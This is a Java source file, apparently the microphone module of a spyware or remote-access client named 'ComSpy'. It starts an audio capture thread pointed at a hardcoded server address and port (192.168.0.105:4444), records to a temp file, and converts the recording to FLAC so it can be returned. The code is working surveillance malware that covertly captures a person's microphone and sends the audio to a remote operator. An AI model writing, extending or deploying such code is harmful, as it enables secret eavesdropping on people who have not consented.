/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package audio;

import Comman.Tool;
import compy_client.ComSpy;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import javaFlacEncoder.FLAC_FileEncoder;
import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioSystem;

/**
 *
 * @author abaza
 */
public class audio_implimantation {

    public MicAudioSystem.Audio AudioThread = null;
    public File AudioFile;
    private Tool cTool;
    String ServerFile = null;

    public String Status(boolean SwitchKey) {
        if (SwitchKey) {
            return StartRecord();
        } else {
            return StopRecord();
        }
    }

    private String StartRecord() {
        ComSpy.MessageLog("Record Start");
        if (AudioThread == null) {
            try {
                AudioThread = new MicAudioSystem.Audio();
                AudioThread.init(0, "192.168.0.105", 4444);
                AudioThread.start();
                cTool = new Tool();
                AudioFile = cTool.createTempDir(0);
                return "true";
            } catch (FileNotFoundException ex) {
                return "false";
            }
        }
        return "false";
    }

    private String StopRecord() {
        ComSpy.MessageLog("Record Stop");
        if (AudioThread != null) {
            AudioThread.stop();
            try {
                Thread.sleep(500);
            } catch (InterruptedException ex) {
            }
            String FinalFile = saveToFile(AudioFile.getAbsolutePath().trim(), AudioFileFormat.Type.WAVE);

            if (FinalFile == null) {
                AudioThread = null;
                return null;
            }

            if (!FinalFile.isEmpty()) {
                AudioThread = null;
                return FinalFile;
            } else {
                cTool.Log("Can't Save Audio File", "Audio Implimantation");
                AudioThread = null;
                return null;
            }
        }
        return null;
    }

    private String saveToFile(String Name, AudioFileFormat.Type fileType) {
        ComSpy.MessageLog("Write Record");
        File target = new File(Name);

        if (AudioThread.audioInputStream == null) {
            ComSpy.MessageLog("No loaded audio to save");
            return null;
        }
        try {
            if (AudioSystem.write(AudioThread.audioInputStream, fileType, target) == -1) {
                throw new IOException("Problems writing to file");
            }
        } catch (Exception ex) {
            ComSpy.MessageLog(ex.toString());
            return null;
        }
        try {
            AudioThread.audioInputStream.reset();
            FLAC_FileEncoder flacEncoder = new FLAC_FileEncoder();
            File inputFile = new File(target.getAbsolutePath());
            File outputFile = new File(target.getName() + ".flac");

            flacEncoder.encode(inputFile, outputFile);
            inputFile.delete();
            return outputFile.getAbsolutePath();
        } catch (Exception e) {
            ComSpy.MessageLog("Unable to reset stream " + e);
            return null;
        }

    }
}
